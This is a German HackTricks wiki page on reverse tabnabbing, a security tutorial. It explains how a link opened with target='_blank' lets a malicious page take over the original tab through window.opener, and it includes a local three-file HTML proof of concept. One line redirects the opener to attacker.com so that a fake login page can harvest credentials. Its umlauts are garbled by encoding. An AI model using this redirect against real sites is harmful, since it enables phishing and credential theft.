{% hint style="success" %}
Lernen & √ºben Sie AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Lernen & √ºben Sie GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Unterst√ºtzen Sie HackTricks</summary>

* √úberpr√ºfen Sie die [**Abonnementpl√§ne**](https://github.com/sponsors/carlospolop)!
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos senden.

</details>
{% endhint %}


# Beschreibung

In einer Situation, in der ein **Angreifer** das **`href`**-Argument eines **`<a`**-Tags mit dem Attribut **`target="_blank" rel="opener"`** kontrollieren kann, das von einem Opfer angeklickt wird, **zeigt der Angreifer** diesen **Link** auf eine Website unter seiner Kontrolle (eine **b√∂sartige** **Website**). Sobald das **Opfer** auf den Link klickt und die Website des Angreifers aufruft, kann diese **b√∂sartige** **Website** die **urspr√ºngliche** **Seite** √ºber das JavaScript-Objekt **`window.opener`** **steuern**.\
Wenn die Seite **`rel="opener"` nicht hat, aber `target="_blank"` enth√§lt und auch kein `rel="noopener"` hat, k√∂nnte sie ebenfalls anf√§llig sein.

Eine g√§ngige Methode, dieses Verhalten auszunutzen, w√§re, die **Position der urspr√ºnglichen Website** √ºber `window.opener.location = https://attacker.com/victim.html` auf eine vom Angreifer kontrollierte Website zu √§ndern, die **wie die urspr√ºngliche aussieht**, sodass sie das **Anmeldeformular** der urspr√ºnglichen Website **imitieren** und den Benutzer nach Anmeldeinformationen fragen kann.

Beachten Sie jedoch, dass der **Angreifer nun das Fensterobjekt der urspr√ºnglichen Website steuern kann**, sodass er es auf andere Weise ausnutzen kann, um **versteckte Angriffe** durchzuf√ºhren (vielleicht JavaScript-Ereignisse zu √§ndern, um Informationen an einen von ihm kontrollierten Server zu exfiltrieren?)

# √úbersicht

## Mit R√ºcklink

Link zwischen Eltern- und Kindseiten, wenn das Pr√§ventionsattribut nicht verwendet wird:

![https://owasp.org/www-community/assets/images/TABNABBING_OVERVIEW_WITH_LINK.png](https://owasp.org/www-community/assets/images/TABNABBING\_OVERVIEW\_WITH\_LINK.png)

## Ohne R√ºcklink

Link zwischen Eltern- und Kindseiten, wenn das Pr√§ventionsattribut verwendet wird:

![https://owasp.org/www-community/assets/images/TABNABBING_OVERVIEW_WITHOUT_LINK.png](https://owasp.org/www-community/assets/images/TABNABBING\_OVERVIEW\_WITHOUT\_LINK.png)

## Beispiele <a href="#examples" id="examples"></a>

Erstellen Sie die folgenden Seiten in einem Ordner und f√ºhren Sie einen Webserver mit `python3 -m http.server` aus.\
Dann **greifen Sie zu** `http://127.0.0.1:8000/`vulnerable.html, **klicken** Sie auf den Link und beachten Sie, wie sich die **URL** der **urspr√ºnglichen** **Website** **√§ndert**.

{% code title="vulnerable.html" %}
```markup
<!DOCTYPE html>
<html>
<body>
<h1>Victim Site</h1>
<a href="http://127.0.0.1:8000/malicious.html" target="_blank" rel="opener">Controlled by the attacker</a>
</body>
</html>
```
{% endcode %}

{% code title="malicious.html" %}
```markup
<!DOCTYPE html>
<html>
<body>
<script>
window.opener.location = "http://127.0.0.1:8000/malicious_redir.html";
</script>
</body>
</html>
```
{% endcode %}

{% code title="malicious_redir.html" %}
```markup
<!DOCTYPE html>
<html>
<body>
<h1>New Malicious Site</h1>
</body>
</html>
```
{% endcode %}

## Zug√§ngliche Eigenschaften <a href="#accessible-properties" id="accessible-properties"></a>

In dem Szenario, in dem ein **cross-origin** Zugriff erfolgt (Zugriff √ºber verschiedene Domains), sind die Eigenschaften der **window** JavaScript-Klasseninstanz, auf die durch die **opener** JavaScript-Objektreferenz verwiesen wird, die von einer b√∂swilligen Seite zugegriffen werden k√∂nnen, auf die folgenden beschr√§nkt:

- **`opener.closed`**: Diese Eigenschaft wird verwendet, um festzustellen, ob ein Fenster geschlossen wurde, und gibt einen booleschen Wert zur√ºck.
- **`opener.frames`**: Diese Eigenschaft bietet Zugriff auf alle iframe-Elemente im aktuellen Fenster.
- **`opener.length`**: Die Anzahl der im aktuellen Fenster vorhandenen iframe-Elemente wird durch diese Eigenschaft zur√ºckgegeben.
- **`opener.opener`**: Eine Referenz auf das Fenster, das das aktuelle Fenster ge√∂ffnet hat, kann durch diese Eigenschaft erhalten werden.
- **`opener.parent`**: Diese Eigenschaft gibt das √ºbergeordnete Fenster des aktuellen Fensters zur√ºck.
- **`opener.self`**: Zugriff auf das aktuelle Fenster selbst wird durch diese Eigenschaft bereitgestellt.
- **`opener.top`**: Diese Eigenschaft gibt das oberste Browserfenster zur√ºck.

In F√§llen, in denen die Domains identisch sind, erh√§lt die b√∂swillige Seite jedoch Zugriff auf alle Eigenschaften, die durch die [**window**](https://developer.mozilla.org/en-US/docs/Web/API/Window) JavaScript-Objektreferenz exponiert werden.

# Pr√§vention

Pr√§ventionsinformationen sind im [HTML5 Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/HTML5\_Security\_Cheat\_Sheet.html#tabnabbing) dokumentiert.

## Referenzen

* [https://owasp.org/www-community/attacks/Reverse_Tabnabbing](https://owasp.org/www-community/attacks/Reverse_Tabnabbing)

{% hint style="success" %}
Lerne & √ºbe AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Lerne & √ºbe GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Unterst√ºtze HackTricks</summary>

* √úberpr√ºfe die [**Abonnementpl√§ne**](https://github.com/sponsors/carlospolop)!
* **Tritt der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folge** uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teile Hacking-Tricks, indem du PRs zu den** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos einreichst.

</details>
{% endhint %}
